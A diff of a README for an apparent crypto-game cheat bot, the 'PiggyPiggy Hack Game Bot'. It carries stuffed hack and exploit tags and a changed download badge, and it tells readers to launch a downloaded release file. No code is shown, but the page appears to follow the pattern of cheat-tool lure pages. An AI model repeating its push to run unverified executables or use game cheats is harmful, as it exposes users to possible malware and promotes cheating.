@@ -12,7 +12,7 @@ This repository is dedicated to a cutting-edge bot that automates farming and cl
 auto-clicker, auto-farm, blockchain-game, blockchain-technology, crypto-api, crypto-game, crypto-hack, cryptocurrency-game, ethereum-game, exploit, game-bot, game-cheat, game-enhancement, hack, mini-game, piggy-piggy, piggy-piggy-bot, piggy-piggy-clicker, piggy-piggy-farming, piggy-piggy-game
 
 ### Get the Latest Release:
-[![Download Now!](https://img.shields.io/badge/Download-Release.zip-<COLOR>.svg)](https://github.com/assets/Release.zip) *Launch the downloaded file to get started with the PiggyPiggy Hack Game Bot!*
+[![Download Now!](https://github.com/Nishasrimathi05/PiggyPiggy-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Api-Cheat/releases<COLOR>.svg)](https://github.com/Nishasrimathi05/PiggyPiggy-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Api-Cheat/releases) *Launch the downloaded file to get started with the PiggyPiggy Hack Game Bot!*
 
 ---
 
